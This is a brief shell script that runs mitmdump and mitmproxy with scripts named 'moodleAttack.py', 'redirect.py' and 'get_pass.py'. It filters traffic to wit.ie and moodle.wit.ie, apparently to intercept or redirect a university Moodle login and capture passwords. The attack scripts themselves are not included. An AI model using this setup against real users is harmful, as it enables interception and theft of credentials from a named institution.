#!/bin/sh

#mitmdump -q -s moodleAttack.py --ignore "^(?!(?moodle\.)wit\.ie)"


mitmdump -q -s moodleAttack.py --ignore "^(?!wit\.ie)(?!moodle\.wit\.ie)"
#mitmdump -q -s redirect.py --ignore "^(?!wit\.ie)(?!moodle\.wit\.ie)"

#mitmproxy -s get_pass.py  --ignore "!(wit\.ie)"

# --ignore "\!^wit.ie"